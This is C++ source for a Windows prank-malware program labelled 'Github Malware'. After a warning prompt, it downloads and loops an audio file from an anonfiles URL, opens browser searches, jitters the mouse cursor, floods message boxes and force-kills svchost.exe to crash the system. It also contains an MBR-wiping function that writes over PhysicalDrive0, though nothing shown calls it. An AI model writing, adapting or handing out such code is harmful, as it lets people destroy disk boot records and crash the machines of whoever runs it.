#include <iostream>
#include <urlmon.h>
#include <Windows.h>
#include <stdio.h>
void Entry();
#include <shellapi.h>
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Winmm.lib")
using namespace std;
int played = false;
TCHAR path[MAX_PATH];

void ClearMBR() {
	char m[512] = "ehehhehe";
	DWORD Bytes;
	HANDLE FirstSector = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ || GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(FirstSector, &m, strlen(m), &Bytes, NULL);
	system("taskkill.exe /f /im svchost.exe");
}

DWORD WINAPI OpenBrowser(LPVOID lparam) {
	for (int i = 0; i <= 4; i++) {
		string array_[] = { "https://www.google.com/search?q=how+to+sell+heroine+and+dont+get+caught", "https://www.google.com/search?q=minecraft+mods+cracked", "https://www.google.com/search?q=justinbieberfreedownloadsongs2021", "https://www.google.com/search?q=fortnite+cheats+no+virus", "https://thepiratebay.org" };
		string cmd = "start " + array_[i];
		system(cmd.c_str());
		Sleep(20000);
	}
	return 0;
}

DWORD WINAPI CreateMessageBoxes(LPVOID lparam) {
	MessageBox(NULL, L"Good luck on finding your VM Snapshot, hahaha!", L"Github Malware", MB_ICONERROR);
	return 0;
}

BOOL WINAPI Ctrlhandler(DWORD fdwCtrlType) {
	for (int i = 0; i <= 30; i++) {
		CreateThread(NULL, NULL, &CreateMessageBoxes, NULL, NULL, NULL);
	}
	MessageBox(NULL, L"oh, is it dead?", L"Github Malware", MB_ICONERROR);
	system("taskkill.exe /f /im svchost.exe");
	return 0;
}


void RandomStuff() {
	GetCurrentDirectory(MAX_PATH, path);
	URLDownloadToFileA(NULL, "https://cdn-118.anonfiles.com/xdA8E149u9/7f999be1-1625498742/loud%20indian%20music.wav", (char)path + "/KJSDIFUSHGUESHG.wav", NULL, NULL);
	PlaySound(L"KJSDIFUSHGUESHG.wav", NULL, SND_LOOP);
	CreateThread(NULL, NULL, &OpenBrowser, NULL, NULL, NULL);
	while (true) {
		played = true;
		POINT pCursor;
		GetCursorPos(&pCursor);
		SetCursorPos(pCursor.x + 10, pCursor.y + 15);
		Sleep(250);
	}
	return;
}


void Entry() {
	MessageBox(NULL, L"Your PC has officially been infected by GitHub Malware. Good luck recovering it, nerd!", L"Github Malware", MB_ICONERROR);
	RandomStuff();
	return;
}

int main()
{
   char c;
   const int confirmation1 = MessageBox(NULL, L"WARNING! This Open-Source prject is Malware! It will completely destroy your computer. Are you sure you want to execute it?", L"ALERT PLEASE READ", MB_YESNO);
   if (confirmation1 == IDYES) {
	   SetConsoleCtrlHandler(&Ctrlhandler, TRUE);
	   system("start https://pastebin.com/raw/rBFnbWFV");
	   Entry();
   }
   else {
	   MessageBox(NULL, L"Exitting..", L"Goodbye!", MB_OK);	
	   system("pause");
   }
   system("pause");
   return 0;
}
